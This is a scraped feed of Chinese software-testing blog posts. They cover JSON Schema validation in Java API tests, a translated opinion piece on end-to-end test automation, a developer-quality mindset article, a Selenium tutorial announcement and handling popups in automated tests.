\u0026#34;anyOf\u0026#34;: [ { \u0026#34;$id\u0026#34;: \u0026#34;#/properties/hobby/items/anyOf/0\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;The first anyOf schema\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;An explanation about the purpose of this instance.\u0026#34;, \u0026#34;default\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;examples\u0026#34;: [ \u0026#34;watch movies\u0026#34;, \u0026#34;play football\u0026#34; ] } ] } } }, \u0026#34;additionalProperties\u0026#34;: true } 看上去很多很乱对不对，别着急，我们慢慢看\n$schema 关键字表明此模式是根据标准的特定草案编写的，并且用于各种原因，主要是版本控制。 $id 关键字定义模式的 URI 和模式中其他 URI 引用解析的基本 URI。 title和description注释关键字只是描述性的。 它们不会对正在验证的数据添加约束。 使用这两个关键字来说明模式的意图。 type 关键字定义了我们的 JSON 数据的第一个约束，在这种情况下，它必须是一个 JSON 对象。 更具体一点\nproperties里定义了各个字段的详情，我们可以在里面增加更多的约束\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 { \u0026#34;$schema\u0026#34;: \u0026#34;http://json-schema.org/draft-07/schema\u0026#34;, \u0026#34;$id\u0026#34;: \u0026#34;http://example.com/example.json\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;object\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;The root schema\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;The root schema comprises the entire JSON document.\u0026#34;, \u0026#34;default\u0026#34;: {}, \u0026#34;examples\u0026#34;: [ { \u0026#34;employeeId\u0026#34;: 1, \u0026#34;employeeName\u0026#34;: \u0026#34;Fulan\u0026#34;, \u0026#34;employeeAge\u0026#34;: 23, \u0026#34;jobTitle\u0026#34;: \u0026#34;SDET\u0026#34;, \u0026#34;hobby\u0026#34;: [ \u0026#34;watch movie\u0026#34;, \u0026#34;play football\u0026#34; ] } ], \u0026#34;required\u0026#34;: [ \u0026#34;employeeId\u0026#34;, \u0026#34;employeeName\u0026#34;, \u0026#34;employeeAge\u0026#34;, \u0026#34;jobTitle\u0026#34;, \u0026#34;hobby\u0026#34; ], \u0026#34;properties\u0026#34;: { \u0026#34;employeeId\u0026#34;: { \u0026#34;$id\u0026#34;: \u0026#34;#/properties/employeeId\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;integer\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;The employeeId schema\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;An explanation about the purpose of this instance.\u0026#34;, \u0026#34;default\u0026#34;: 0, \u0026#34;examples\u0026#34;: [ 1 ] }, \u0026#34;employeeName\u0026#34;: { \u0026#34;$id\u0026#34;: \u0026#34;#/properties/employeeName\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;The employeeName schema\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;An explanation about the purpose of this instance.\u0026#34;, \u0026#34;default\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;examples\u0026#34;: [ \u0026#34;Fulan\u0026#34; ] }, \u0026#34;employeeAge\u0026#34;: { \u0026#34;$id\u0026#34;: \u0026#34;#/properties/employeeAge\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;integer\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;The employeeAge schema\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;An explanation about the purpose of this instance.\u0026#34;, \u0026#34;default\u0026#34;: 0, \u0026#34;exclusiveMinimum\u0026#34;: 20, \u0026#34;examples\u0026#34;: [ 23 ] }, \u0026#34;jobTitle\u0026#34;: { \u0026#34;$id\u0026#34;: \u0026#34;#/properties/jobTitle\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;The jobTitle schema\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;An explanation about the purpose of this instance.\u0026#34;, \u0026#34;default\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;minLength\u0026#34;: 4, \u0026#34;examples\u0026#34;: [ \u0026#34;SDET\u0026#34; ] }, \u0026#34;hobby\u0026#34;: { \u0026#34;$id\u0026#34;: \u0026#34;#/properties/hobby\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;array\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;The hobby schema\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;An explanation about the purpose of this instance.\u0026#34;, \u0026#34;default\u0026#34;: [], \u0026#34;examples\u0026#34;: [ [ \u0026#34;watch movies\u0026#34;, \u0026#34;play football\u0026#34; ] ], \u0026#34;additionalItems\u0026#34;: true, \u0026#34;items\u0026#34;: { \u0026#34;$id\u0026#34;: \u0026#34;#/properties/hobby/items\u0026#34;, \u0026#34;anyOf\u0026#34;: [ { \u0026#34;$id\u0026#34;: \u0026#34;#/properties/hobby/items/anyOf/0\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;The first anyOf schema\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;An explanation about the purpose of this instance.\u0026#34;, \u0026#34;default\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;examples\u0026#34;: [ \u0026#34;watch movies\u0026#34;, \u0026#34;play football\u0026#34; ] } ] }, \u0026#34;uniqueItems\u0026#34;: true } }, \u0026#34;additionalProperties\u0026#34;: true } 在上面的例子中我们规定\nemployeeId的默认值是0 employeeAge最小值是20 jobTitle的最小长度是4 hobbies必须排重，所以uniqueItems的值是true json schema合约可以尽可能的详细，这样模糊的点就会相对较少，验证的结果会更加的准确。\n在测试框架中使用json schema 这里以java为例，首先我们引入json schema的支持，然后定义断言工具，最后在用例中使用该断言。\n引入json schema支持，这里用的是https://github.com/everit-org/json-schema，pom.xml如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;groupId\u0026gt;org.example\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;json-schema\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0-SNAPSHOT\u0026lt;/version\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;maven.compiler.source\u0026gt;8\u0026lt;/maven.compiler.source\u0026gt; \u0026lt;maven.compiler.target\u0026gt;8\u0026lt;/maven.compiler.target\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.testng\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;testng\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;7.4.0\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.everit.json\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;org.everit.json.schema\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.3.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-databind\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.12.4\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.rest-assured\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;rest-assured\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.3.0\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/project\u0026gt; view raw 定义断言工具函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package utils; import com.fasterxml.jackson.databind.ObjectMapper; import functest.APITest; import org.everit.json.schema.Schema; import org.everit.json.schema.ValidationException; import org.everit.json.schema.loader.SchemaLoader; import org.json.JSONObject; import org.json.JSONTokener; import org.testng.Assert; import java.util.logging.Logger; public class JsonSchemaUtils { private static Logger LOGGER= Logger.getLogger(String.valueOf(JsonSchemaUtils.class)); private ObjectMapper objMapper = new ObjectMapper(); public void checkJsonSchema(String jsonSchemaPath, String jsonSubject) throws ValidationException { JSONObject retVal = new JSONObject(); try { JSONObject jsonSchema = new JSONObject(new JSONTokener(APITest.class.getResourceAsStream(jsonSchemaPath))); Schema schema = SchemaLoader.load(jsonSchema); schema.validate(objMapper.convertValue(jsonSubject, JSONObject.class)); retVal.put(\u0026#34;errorMessage\u0026#34;,\u0026#34;\u0026#34;); } catch (ValidationException ex) { ex.printStackTrace(); LOGGER.info(\u0026#34;JSON Schema Error Message: \u0026#34; + ex.getMessage()); retVal.put(\u0026#34;errorMessage\u0026#34;,ex.getMessage()); Assert.assertEquals(retVal.getString(\u0026#34;errorMessage\u0026#34;), \u0026#34;\u0026#34;); } Assert.assertEquals(retVal.getString(\u0026#34;errorMessage\u0026#34;), \u0026#34;\u0026#34;); } } 在用例中使用\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package functest; import io.restassured.RestAssured; import org.json.JSONObject; import org.testng.annotations.Test; import io.restassured.response.Response; import utils.JsonSchemaUtils; public class APITest { private final static String JSON_SCHEMA_ACTIVITY_PATH = \u0026#34;/schema/apiTest-jsonSchema.response.json\u0026#34;; JsonSchemaUtils jsonSchemaUtils = new JsonSchemaUtils(); @Test public void getTest() { Response response = RestAssured.get(\u0026#34;https://www.boredapi.com/api/activity/\u0026#34;); JSONObject jsonObj = new JSONObject(response.getBody().asString()); System.out.println(jsonObj.toString(4)); jsonSchemaUtils.checkJsonSchema(JSON_SCHEMA_ACTIVITY_PATH,response.asString()); } } 最后 JSON schema 是一个多功能库，可以帮助我们执行 API 测试，使用 JSON 文件定义 schema 要求的能力显示了这个库的强大功能。 希望这些示例能让您了解如何在项目中使用模式验证。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E8%BF%9B%E9%98%B6%E5%9C%A8%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E4%B8%AD%E6%A1%86%E6%9E%B6%E4%B8%AD%E4%BD%BF%E7%94%A8json-schema/","title":"接口测试进阶：在接口测试中框架中使用json schema"},{"content":"当前市场上各种端到端的测试工具层出不穷，工具市场很繁荣，但真正成功的项目实践却很少见。今天看到了一篇很有意思的文章，我愿称作者为典型的selenium原教旨主义者， 他的一些观点尽管看上去非常的old school，不过总的来说是很有道理的，这里简单的分享一下他的观点。\n他的这篇文章叫做Correct two Common Misconceptions: End-to-End Test Automation is “Simple and Easy” or “Complex and Impossible”，翻译过来就是纠正两个常见的错误观念。端到端测试自动化是 \u0026ldquo;简单而容易 \u0026ldquo;还是 \u0026ldquo;复杂而不可能\u0026rdquo;, 原文的地址是https://zhiminzhan.medium.com/correct-two-common-misconceptions-end-to-end-test-automation-is-simple-and-easy-or-complex-and-ad559ade982a。\n一切都开始于这样的一个观点:\n事实：大多数测试自动化的尝试都失败了\n\u0026ldquo;根据我在这个领域17年的经验，我同意图片中描述的主要概念，即大多数测试自动化的努力往往是失败的。\u0026rdquo; - 作者\n端到端测试自动化是简单还是复杂？ 答案取决于你问谁。在过去的30年里，测试自动化供应商，如惠普，一直在推销 \u0026ldquo;记录/回放 \u0026ldquo;和 \u0026ldquo;对象识别工具 \u0026ldquo;的概念。尽管这些方法已经被证明是无效的，但一些供应商仍然坚持使用这些方法。\n在一个典型的软件团队中，众多的软件工程师和经理可能认为 \u0026ldquo;测试自动化 \u0026ldquo;是一个简单的任务，尽管没有人见过测试自动化的成功实施（也就是说，团队完全依靠手工测试）。作为证据，许多招聘广告要求申请人有 \u0026ldquo;创建测试自动化框架 \u0026ldquo;的经验，这似乎很荒谬。\n所以，端到端的测试自动化可能并不像许多人想象的那样简单和容易。\n\u0026ldquo;根据我的经验，优秀的开发人员不一定能成为优秀的测试人员，但优秀的测试人员（同时具有很强的设计能力）可以成为优秀的开发人员。这是一种心态和一种激情。\u0026hellip;他们是黄金\u0026rdquo;。\n谷歌副总裁帕特里克-科普兰，在一次采访中（2010年） \u0026ldquo;95%的时间，95%的测试工程师会写出糟糕的GUI自动化，只是因为它是一件非常难做的事情。\n这篇来自微软测试大师Alan Page的采访（2015年） \u0026ldquo;测试比开发更难。如果你想有好的测试，你需要把你最好的人放在测试中\u0026rdquo;。\nGerald Weinberg，在一个播客中（2018年）。 考虑到事实和上述知名专家的引言，似乎完成端到端的测试自动化是一个无法克服的挑战。\n我的答案是 \u0026ldquo;它可以很简单，但往往是人为的错误使它变得不必要的困难。\u0026rdquo;\n许多人做出了明显的错误的决定 我见过错误的决定，往往不止一个，在失败的测试自动化尝试中。\n😱 使用编译语言，如Java/C#，作为脚本语言。 我们称之为 \u0026ldquo;测试脚本\u0026rdquo;，是有很好的理由的！请看这篇文章，\u0026ldquo;自动化测试脚本应采用脚本语言的语法，自然！\u0026rdquo;\n😱 使用Gherkin，例如Cucumber/SpecFlow，作为测试语法。 这大大增加了维护的工作量，但几乎没有任何价值。查看《为什么小黄瓜（Cucumber，SpecFlow\u0026hellip;）在UI测试自动化中总是失败？ 😱 使用JavaScript作为端到端测试自动化的语言。\nJavaScript是一种复杂的语言（主要用于前端开发），不适合测试自动化（如恼人的await，node_modules，\u0026hellip;）。我遇到的每个JS测试员都是假的，没有例外。 毫不奇怪，假的测试人员在几年的时间里循环使用PhantomJS -\u0026gt; WebDriverIO -\u0026gt; Protractor -\u0026gt; TestCafe -\u0026gt; Pupetteer -\u0026gt; Cypress -\u0026gt; Playwright，结果都一样：失败。 请看 \u0026ldquo;为什么JavaScript不适合用于真正的网络测试自动化？\u0026rdquo;\n😱 使用一个错误的框架或工具. 一个典型的例子是Cypress，一个有一长串限制的 \u0026ldquo;测试自动化框架\u0026rdquo;。这简直是疯了! 因为Selenium WebDriver是基于W3C标准的，并且被所有浏览器供应商所支持。此外，它已经被证明了。从Cypress测试自动化尝试失败的反馈中，我跟自己和解了，\u0026ldquo;原始Selenium WebDriver比Cypress容易得多（学习、使用、维护\u0026hellip;，）\u0026quot;。\n\u0026ldquo;Facebook每天发布两次，保持这种节奏是我们文化的核心。在这种发布速度下，用Selenium进行自动化测试对确保在发布前一切正常至关重要\u0026rdquo;。- DAMIEN SERENI，Facebook的工程总监，在Selenium 2013会议上。\n😱 测试自动化工具和脚本的风格是由一两个工程师的个人喜好选择的。 端到端测试自动化的受众是整个团队，包括业务分析师，手动测试人员，甚至是客户，他们不需要开发自动化测试，但他们应理解测试脚本并能自如地运行它们。\n😱 在一个典型的CI服务器中运行端到端测试，例如Jenkins或Bamboo。 CI服务器是为执行单元或集成测试而建立的。端到端的UI测试更容易发生变化，需要更长的时间。你应该使用一个合适的持续测试服务器，如Facebook的Sandcastle或BuildWise。\n我可以列举更多，但大多数读者可能想知道，\u0026ldquo;够了，我们知道失败的原因。你有一个简单的解决方案吗？\u0026quot;。是的，我有。\n我的 \u0026ldquo;简单而正确 \u0026ldquo;的解决方案 自2011年以来，我一直在实施端到端的测试自动化，成功率为100%，使用的是同一个公式。这个逻辑是如此简单和明显。\n使用原始的Selenium WebDriver 由W3C定义的网络技术基本没有变化，所以我使用原始的Selenium WebDriver（W3C标准）。 使用最好的、易学的、经过验证的脚本语言，Ruby。 对于那些想要一个完整的解决方案的人来说（向他们的经理吹彩虹屁）。\n简单的测试自动化策略 你不需要花1分钟的时间。所有端到端的测试自动化都是一样的。只要使用我的35字功能测试自动化策略。 原始Selenium WebDriver作为网络测试自动化框架.是的，原始的，不要费心在它上面创建一个所谓的框架；Protractor（由angular团队）尝试过，但失败了。只要遵循可维护的自动化测试设计，并使用一个支持功能测试重构的好工具。 用简单的RSpec框架. 你可以在几分钟内学会，真的。另外，使用Rspec意味着测试脚本使用Ruby，这是端到端测试自动化的最佳脚本语言。 开发你的测试脚本，对维护是友好的。 不要使用记录/回放或类似的，只是手工制作，这可以是简单和有趣的，在一个富有成效的测试IDE或编程编辑器。 如果你还没有使用TestWise，可以去看看。 在一个真正的持续测试服务器中运行所有的端到端测试，每天如此.在自动化E2E软件测试中，不要以 \u0026ldquo;100%覆盖率 \u0026ldquo;为目标，这是不可能的，也没有必要。事实上，很少有软件项目能够维持一套50个端到端（通过UI）的测试，即AgileWay持续测试分级的第二级。 如果你和你的团队发现维护工作具有挑战性，请接受现实（需要技能或应寻求辅导），但要保持所有现有测试的有效性。即使是一个小的工作自动化端到端套件，例如20个测试，只要它们是有效的，就能提供价值。\n值得注意的是，与许多所谓的测试自动化解决方案不同，上述解决方案是免费的（因为在100%的自由和没有/很少的钱），开放和面向未来的。\n根据 \u0026ldquo;Hired\u0026rsquo;s 2023 State of Software Engineers \u0026ldquo;报告，\u0026ldquo;Ruby on Rails是最需要的技能\u0026rdquo;，而Ruby是第二位。因此，无论你是受雇于软件工程师还是测试自动化工程师，都没有正当理由不从今天开始学习Ruby，这既是为了你正在进行的项目，也是为了你的个人职业发展。\n简单≠容易 在电影《中央情报局》中，当有人问起鲍勃（主角）的转变时，他说他只做了一件事：他去了健身房。\u0026ldquo;6个小时。每一天。在过去的20年里。直线，\u0026ldquo;鲍勃说。经典的软件工程书籍《务实的程序员》传达了同样的概念。\n一位参观英国伊顿学院的游客问园丁，他是如何把草坪弄得如此完美的。\u0026ldquo;这很简单，\u0026ldquo;他回答说，\u0026ldquo;你只是每天早上刷掉露水，每隔一天修剪一次，每周滚一次。\u0026rdquo;\n\u0026ldquo;就这些吗？\u0026ldquo;游客问。\u0026ldquo;绝对是这样。\u0026ldquo;园丁回答。\u0026ldquo;这样做500年，你也会有一个漂亮的草坪。\u0026rdquo; 出自The Pragmatic Programmer book\n自动化的真正挑战是维护，而不是创建（~10%，努力程度）。如果一个团队发现测试的创建很复杂，很困难，那么持续的维护（每天多次运行整个端到端的套件）将是不可能的。\n请看我的另一篇文章，如何实现真正的自动化回归测试？\n总结 所以，有些读者可能只是想直接回答这个问题，\u0026ldquo;端到端是简单还是复杂，容易还是困难？\u0026quot;。\n我的简短回答是：\u0026ldquo;简单，不一定难，可以迅速获得良好的效益\u0026rdquo;，如果以正确的方式进行。效益有多大？这取决于对保障的期望。\n我的女儿在12岁的时候就可以轻松地开发和维护一套20个端到端的Selenium测试，即 \u0026ldquo;AgileWay持续测试分级 \u0026ldquo;的第二级。是的，仅仅是几天的临时培训（因为她当时还是个初中生）。\n她去年从大学毕业了。她现在的水平如何？根据我的评估，她的测试自动化能力是~75个测试。这里，我总是指每个工作日维持运行整个套件的能力。\n没有做过真正的测试自动化的人可能不会掌握这个概念。我可以告诉你她的测试自动化水平相当高，\u0026gt;99.5%。去年，在她在一家大型电信公司的第一个实习角色中。她开发了一套自动化测试（并每天运行），速度之快令公司震惊（她的同事以前没有见过）。所谓的 \u0026ldquo;最好的自动化工程师 \u0026ldquo;无法保持20个测试的有效性，所以这个家伙整个人都不好了。请看这个故事，一个IT毕业生对一个假的\u0026rsquo;高级测试自动化工程师\u0026rsquo;的挫折。\n要达到我的水平（500多个测试，如前所示），我的女儿还有很长的路要走（顺便说一下，她在FAANG担任软件开发工程师，而不是QA工程师，测试自动化是她自学的）。但是对于那些希望获得测试自动化价值的公司来说，例如执行少数几个关键的自动化测试作为回归测试，没有任何测试自动化经验的人可以在良好的指导下，在几天内迅速实现。即使是少量的测试，只要它们每天都在运行并且有效，就能提供良好的价值。请看我女儿的文章，在你上班的第一天就在CT服务器中设置、开发自动UI测试并运行它们，以及我的文章，如何在软件项目入职的第一天就开始测试自动化？\n但如果你的目标是 \u0026ldquo;早发布，多发布 \u0026ldquo;或 \u0026ldquo;每日生产发布\u0026rdquo;，即真正的敏捷由真正的测试自动化支持，并有数百个端到端测试的良好覆盖，这并不容易。捷径是向曾经做过的人学习（极其罕见）。\n再总结 上面基本上是对作者文章的翻译，总的看下来我觉得他的文风，内容以及观点其实挺有意思的\n引经据典很多，看起来就很专业的样子 高清说说法就是挺自信的，低情商就是感觉有点像吹牛的样子 有点原教旨主义，比如selenium是最好的，ruby是最好的，十年前这样说基本没啥问题，十年后，当然我内心里是完全同意他的看法的，其实自动化测试这些年来变化很多，我是乐于看到其他工具和解决方案带来的新变化的 我女儿如何如何，中年人标配了 他的观点大部分都是经得起推敲的，比如selenium最为主流，用脚本语言写用例比较简单，一些老练的选择可以让ui自动化变得更加容易等 ","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E7%BA%A0%E6%AD%A3%E4%B8%A4%E4%B8%AA%E5%B8%B8%E8%A7%81%E7%9A%84%E9%94%99%E8%AF%AF%E8%A7%82%E5%BF%B5%E7%AB%AF%E5%88%B0%E7%AB%AF%E6%B5%8B%E8%AF%95%E8%87%AA%E5%8A%A8%E5%8C%96%E6%98%AF-%E7%AE%80%E5%8D%95%E8%80%8C%E5%AE%B9%E6%98%93-%E8%BF%98%E6%98%AF-%E5%A4%8D%E6%9D%82%E8%80%8C%E4%B8%8D%E5%8F%AF%E8%83%BD/","title":"纠正两个常见的错误观念。端到端测试自动化是 简单而容易 还是 复杂而不可能"},{"content":"Mindset Shifts For Engineers to Achieve Higher Software Quality\n看到个开发小哥写的关于测试的文章，挺有意思的，翻译了一下，观点虽不新颖，但能从开发角度去思考软件质量，格局上面是值得称赞的。原文地址：https://medium.com/@phdmeyildiz/mindset-shifts-for-engineers-to-achieve-higher-software-quality-8ef8ee00a041\n作为一个刚从大学毕业的初级工程师，没有什么是比掌握越来越多的工具、编程语言等更重要的事情了。当你刚进入工程领域时，你想捣鼓点新东西，然后你想看这些玩意可以正常工作。这是职业生涯早期最大的动力来源。我也是这样做的，并把大部分时间花在这上面。我一直不太理解我的前辈们，他们更关注工作方式，而不是下一个很酷的技术。现在，经过12年的时间，我不仅理解了他们，而且在这里，我写下了我的第一篇文章，讲述了一个简单的思维方式的转变对你的项目的影响会比几十种编程语言大。\n这篇文章是关于转变我们作为软件工程师的心态，在交付产品时获得高的视角，最终让客户的满意提升。下面的思维转变说明没有详细解释，只是用简短的句子写出来，我们可以做更深层次的思考。\n让我们来谈谈我们需要改变的思维模式。👍表示目标思维模式，👎表示我们需要远离的思路。\n哪种工作方式？ 持续交付👍 软件总是处于可发布的状态。 我们可以随时进行发布。 QA尽早介入开发流程。 尽早测试以避免bug的产生，并分析产品的质量。 瀑布式的敏捷 👎 软件需要经过完善流程才能到可发布的状态。 我们需要等到发布那的那个星期才能来进行发布。 QA等到发布之前才能检查软件质量。 测试置后旨在发现已经开发的功能中的错误。 什么时候测试？ 从一开始就进行测试👍 从一开始就进行测试，以增加最终结果的可预测性。 在开发过程中做探索性测试。 开发和测试同时结束。 最后测试 👎 以部署前的例行测试作为开发流程的结束。 在开发过程中可能已经引入了错误，我们的作用是找到它们。 首先开发，最后测试。 谁为质量负责？ 每个人都要对质量负责👍 把质量放在前面和中心，而不是放在pipeline的末端。整个团队都要关注质量。 bug的检测是在开发过程中同步进行的，不存在QA资源是瓶颈的说法! 更少的资源可以做得更多。 只有QA团队对质量负责 👎 把质量作为最后一道防线。 QA成为瓶颈的可能性很大。 需要越来越多的资源来战胜质量问题。 何时交付？ 更快、更小的交付👍 尽量高频率的交付少量的代码 高质量来自于小的、快速的、明确的工作步骤，我们可以在创造变化的过程中进行监控。 岁月静好，我憋大招 👎 一次性交付大量的代码。 当软件很复杂的时候，要验证其质量是比较困难的。 质量保证（QA）还是质量控制？ QA高于质量控制👍 主要关注点是高效的工作方式和建立团队间的和谐。 在从事任何工作时，都要考虑到质量问题。 不断的反馈机制来改善SDLC（软件开发生命周期）的pipeline。 只有质量控制👎 主要关注的是检查最终结果。 当出现问题时，质量成为关注点。 在最后的测试中收到反馈。 什么是QA？ QA是指质量协助👍Q QA团队从开发的开始到结束都处于顾问的位置。 重点是放在质量上，而不是寻找错误。 错误更容易修复，也更便宜。 QA不应该发现bug。当发现一个bug时，它不仅应该被修复，而且应该调查其根本原因。 错误意味着SDLC过程中存在问题，这个过程需要被修正。 QA意味着发布守门员👎 QA团队是一个测试者和bug寻找者。 没有改善质量的空间。 修复问题的成本和风险都比较大。 QA应该找到bug，然后bug应该被修复而不需要进一步挖掘其根本原因。 错误只是一个软件问题。 观点 你对上面的一些思路转变有什么样的看法呢？\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98%E5%BA%94%E8%AF%A5%E8%BF%9B%E8%A1%8C%E6%80%9D%E8%B7%AF%E8%BD%AC%E5%8F%98%E4%BB%A5%E6%8F%90%E5%8D%87%E8%BD%AF%E4%BB%B6%E8%B4%A8%E9%87%8F/","title":"开发人员应该进行思路转变以提升软件质量"},{"content":"2021年其实立过flag，但最终事情太多，没有完成既定的目标。2022年初的时候，想到很久都没有做过教程和视频了，于是兴冲冲的录了一些selenium的全套教程，目录如下：\n环境搭建 跑个脚本先 第1个自动化用例 前进和后退 搞定被测项目 使用id定位 使用name定位 使用xpath定位：定位王者xpath 使用tag name定位 使用class name定位 使用css选择器定位 往文本框里输入内容 执行js脚本 滑动到页面的最底部 各种表单元素的操作 显示等待 page object 常见问题答疑 做的不足的地方 因为录制的时间比较短，所以影片的编辑和准备其实是不够充分的，教程应该能看，不过节奏感不好，毕竟年纪大了，有时候会显得啰嗦了一些。\n另外selenium的一些新特性其实并没有涉及，后面有时间可以重点补充一节。\n亮点 当然，教程也是有一些亮点的。\n脉络基于官方文档，整体的思路还是清楚的； 修正了一些官方文档的不足； 使用本地文件进行演示，不依赖网络，脚本的稳定性还是比较高的 发布节奏 目前b站和微信公众号都在同步更新，每周更新4-5集，目前录了18集，应该1个月就能更新完吧。\n后续计划 准备专门弄一个软件测试视频教程分享站点，代码还没写，不过大致的思路有了，啥时候不忙了就可以开工了。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E4%B8%A4%E5%91%A8%E5%86%85%E5%BD%95%E5%AE%8Cselenium%E6%95%99%E7%A8%8B%E6%98%AF%E4%B8%80%E7%A7%8D%E4%BB%80%E4%B9%88%E6%A0%B7%E7%9A%84%E4%BD%93%E9%AA%8C/","title":"两周内录完selenium教程是一种什么样的体验？"},{"content":"自动化用例的尺度到底怎么拿捏，每个测试团队或者每个人都有自己的想法和方法论，今天看到一篇文章以处理弹框为例比较详细的讨论了这个问题，觉得跟我的思路很接近，这里拿出来分享一下。原文地址：https://responsibleautomation.wordpress.com/2023/01/31/should-test-automation-just-handle-it/\n在文章里作者列举了几个场景\n有时我们收到这个弹出窗口，所以我们检查一下它是否在那里。如果有，我们就点击 \u0026ldquo;取消\u0026rdquo;，然后继续。 有时我们得到一个网页，上面写着 \u0026ldquo;系统不可用\u0026rdquo;，所以我们就点击F5，然后继续，因为这只发生在QA环境中。 有时，应用程序让我们在支付过程中二次登录。 碰到这些情况，自动化脚本应该如何处理？\n从技术上讲我们始终是可以用代码处理这些情况的，不过核心的问题是，遇到这些突发情况，我们是要断言用例成功与否，还是写代码去pass这些细枝末节？有时候这类问题确实很困扰。\n作者把这些问题分为两类\n对业务没影响的，可以容忍的问题 不可容忍的问题 可容忍的问题 作者举了个例子，他们的ios app在进入的时候会弹框，要求用户授权定位和通知权限。遇到这种情况，脚本是直接点掉还是返回错误呢？作者表示他们也不能做决定，最后通过跟客户讨论，客户认为这种问题可以忽略，所以他们最终的策略是点掉，继续后面的流程，这就是可容忍问题的例子。\n不可容忍的问题 还是上面那个app，一些情况下用户没有配置签名会弹出提示框，要求提供签名后继续，这种问题直接影响到了业务流程，就是不可容忍的问题，在这种情况下进行断言会比较好，因为没有签名后面的业务流程都走不通了，应该当做一个异常用例来进行专门的测试。\n总结 